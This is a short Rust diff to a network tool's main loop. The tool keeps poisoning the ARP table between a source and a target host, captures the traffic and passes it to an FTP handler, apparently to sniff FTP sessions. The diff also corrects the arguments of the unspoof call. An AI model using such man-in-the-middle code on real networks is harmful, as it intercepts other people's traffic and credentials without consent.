@@ -53,6 +53,7 @@ fn main() -> Result<()> {
     client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
     println!(" done.");
     while !ctrlc.load(Ordering::Relaxed) {
+        // keep spoofing the arp table
         client.spoof((args.sip, args.smac), (args.tip, args.tmac))?;
         let data = match client.recv() {
             Ok(data) => data,
@@ -78,7 +79,7 @@ fn main() -> Result<()> {
         _ = ftp_handle(data);
     }
     print!("unspoofing...");
-    client.unspoof((args.tip, args.tmac))?;
+    client.unspoof((args.sip, args.smac), (args.tip, args.tmac))?;
     println!(" done.");
     Ok(())
 }
